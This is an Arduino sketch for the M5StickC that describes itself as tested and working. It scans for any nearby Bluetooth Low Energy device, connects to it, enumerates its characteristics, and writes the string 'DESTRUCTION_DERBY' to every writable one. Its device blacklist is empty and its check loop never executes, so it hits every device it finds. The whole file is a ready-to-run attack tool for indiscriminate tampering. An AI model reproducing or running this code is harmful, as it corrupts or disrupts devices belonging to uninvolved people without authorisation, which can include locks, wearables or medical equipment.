/**
 * 
 *  Sketch to connect to any BLE device, map out RemoteCharacteristics and write "DESTRUCTION_DERBY" to every value
 *  Tested & works on M5StickC
 * 
 */

static String spamValue = "DESTRUCTION_DERBY";

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <vector>
#include <M5StickC.h>

using std::vector; 

static vector<String> arrDevices;

static const char *blacklist[] = {
};

static BLEAdvertisedDevice* myDevice;

bool connectToServer() {

  arrDevices.push_back(myDevice->getAddress().toString().c_str());
  
  Serial.print("Connecting : ");
  Serial.println(myDevice->getAddress().toString().c_str());
  Serial.println(myDevice->getName().c_str());
  BLEClient*  pClient  = BLEDevice::createClient();

  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(1,3,1);
  M5.Lcd.println("Connecting:");
  M5.Lcd.println(myDevice->getName().c_str());
  
  pClient->connect(myDevice);
  Serial.print("With ServiceUUID: ");
  Serial.println(myDevice->getServiceUUID().toString().c_str());
  BLERemoteService* pRemoteService = pClient->getService(myDevice->getServiceUUID().toString().c_str());
  if (pRemoteService == nullptr) {
    Serial.println("getService failed: RemoteService nullptr");  
    pClient->disconnect();
    return false;
  }
  
  Serial.println("getService succesfull");
  std::map<uint16_t, BLERemoteCharacteristic*>* mapCharacteristics = pRemoteService->getCharacteristicsByHandle();
  for (std::map<uint16_t, BLERemoteCharacteristic*>::iterator i = mapCharacteristics->begin(); i != mapCharacteristics->end(); ++i) {
    Serial.print(" - characteristic UUID : ");
    Serial.print(i->second->getUUID().toString().c_str());
    Serial.print(" Broadcast:");
    Serial.print(i->second->canBroadcast()?'O':'X');
    Serial.print(" Read:");
    Serial.print(i->second->canRead()?'O':'X');
    Serial.print(" WriteNoResponse:");
    Serial.print(i->second->canWriteNoResponse()?'O':'X');
    Serial.print(" Write:");
    Serial.print(i->second->canWrite()?'O':'X');
    Serial.print(" Notify:");
    Serial.print(i->second->canNotify()?'O':'X');
    Serial.print(" Indicate:");
    Serial.print(i->second->canIndicate()?'O':'X');
    Serial.print(" Value:");
    Serial.print(i->second->readValue().c_str());
    Serial.println();
    if (i->second->canWrite()){
      M5.Lcd.println();
      M5.Lcd.println("Writable: Y");
      Serial.print("Writing out: \"");
      Serial.print(spamValue);
      Serial.println("\"");
      i->second->writeValue(spamValue.c_str());
      M5.Lcd.println("Write success");
    }
  }
  Serial.println("Done!");
  
  M5.Lcd.println("");
  M5.Lcd.println("Resuming scan..");

  return true;
}

class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {

      bool skip = false; 
      
      Serial.print("BLE Discovered device : ");
      Serial.println(advertisedDevice.toString().c_str());
      if (advertisedDevice.haveServiceUUID()) {
        for (int i = 0; i < 0; i++)
        {
          if (strcmp(advertisedDevice.getServiceUUID().toString().c_str(), blacklist[i]) == 0)
          {
            skip = true;
          }
        }
        if (!skip) {
          myDevice = new BLEAdvertisedDevice(advertisedDevice);
        }
        else {
          Serial.println("This ServiceUUID is blacklisted, so skipping");
        }
      }
    }
};

void setup() {
  Serial.begin(115200);
  Serial.println("BLE Discovering devices...");

  M5.begin();
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextColor(GREEN, BLACK);
  M5.Lcd.setCursor(1,60,1);
  M5.Lcd.println(" DESTRUCTION");
  M5.Lcd.println("    DERBY   ");
  M5.Lcd.println("   STARTED  ");
    
  BLEDevice::init("");

  BLEScan* pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setInterval(1349);
  pBLEScan->setWindow(449);
  pBLEScan->setActiveScan(true);
  pBLEScan->start(5, false);
}

void loop() {
  if (myDevice != NULL) {
    if (std::find(arrDevices.begin(), arrDevices.end(), myDevice->getAddress().toString().c_str()) != arrDevices.end())
    {
      Serial.println("Device already connected, skipping");
    }
    else {
      connectToServer();
    }
  }

  delay(1000);
}
